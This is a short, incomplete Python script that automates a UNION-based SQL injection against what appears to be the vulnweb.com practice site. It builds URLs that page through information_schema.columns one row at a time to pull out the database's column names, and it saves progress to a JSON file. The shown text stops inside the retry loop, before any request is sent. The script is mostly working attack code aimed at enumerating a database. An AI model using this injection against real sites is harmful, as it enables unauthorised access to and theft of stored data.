import requests 
from bs4 import BeautifulSoup
import json
import time
import os

url_template = "http://testphp.vulnweb.com/artists.php?artist=0 union select 1,2,column_name from information_schema.columns limit%20 {0},1"
total_id = 430
data = []

if os.path.exists("story_data.json"):
    with open("story_data.json","r") as file:
        existing_data = json.load(file)
        last_limit = existing_data[-1]['limit'] + 1 if existing_data else 0
else:
    last_limit = 0 


for limit in range(last_limit,total_id):
    retries = 0
    success = False
    while retries < 3 and not success:
        url = url_template.format(limit)
        print(url)